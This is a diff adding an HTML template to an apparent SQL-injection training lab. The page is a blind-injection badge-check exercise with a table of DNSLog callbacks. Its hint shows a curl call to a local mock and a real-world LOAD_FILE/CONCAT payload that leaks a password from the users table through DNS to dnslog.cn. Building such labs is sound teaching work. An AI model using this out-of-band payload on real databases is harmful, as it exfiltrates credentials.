@@ -1,0 +1,47 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }} - FieldLab{% endblock %}
+{% block content %}
+{% include 'sqli/partials/lab_header.html' %}
+<div class="workbench two-col">
+  <section class="console-card">
+    <h2>员工 badge 校验（无回显）</h2>
+    <form method="get" action="" class="form-grid">
+      <input type="hidden" name="mode" value="{{ mode }}">
+      <label>badge_code
+        <input type="text" name="badge" value="{{ badge }}" placeholder="例如 BDG-1142">
+      </label>
+      <button class="button-primary" type="submit">校验</button>
+    </form>
+    {% if exists is not none %}
+      <div class="result-banner {{ 'success' if exists else 'warning' }}">
+        {{ '存在该员工' if exists else '不存在' }}
+      </div>
+    {% endif %}
+    <p class="hint">本关页面只回显 exist / not exist，传统盲注效率低。<br>
+      请使用本靶场内置的 DNSLog mock：<br>
+      <code>curl "http://127.0.0.1:5000/api/sqli/dnslog/recv?sub=$(echo -n hello | base64)"</code><br>
+      真实环境通常通过 <code>LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.dnslog.cn\\x'))</code> 触发 DNS 查询。
+    </p>
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+  </section>
+  <aside class="info-card">
+    <h2>DNSLog 接收记录</h2>
+    <table class="data-table">
+      <thead><tr><th>id</th><th>subdomain</th><th>decoded</th><th>at</th></tr></thead>
+      <tbody>
+      {% for c in callbacks %}
+        <tr>
+          <td>{{ c.callback_id }}</td>
+          <td><code>{{ c.subdomain }}</code></td>
+          <td>{{ c.decoded_data }}</td>
+          <td>{{ c.received_at }}</td>
+        </tr>
+      {% else %}
+        <tr><td colspan="4">（暂无回调）</td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </aside>
+</div>
+{% include 'sqli/partials/hints.html' %}
+{% endblock %}
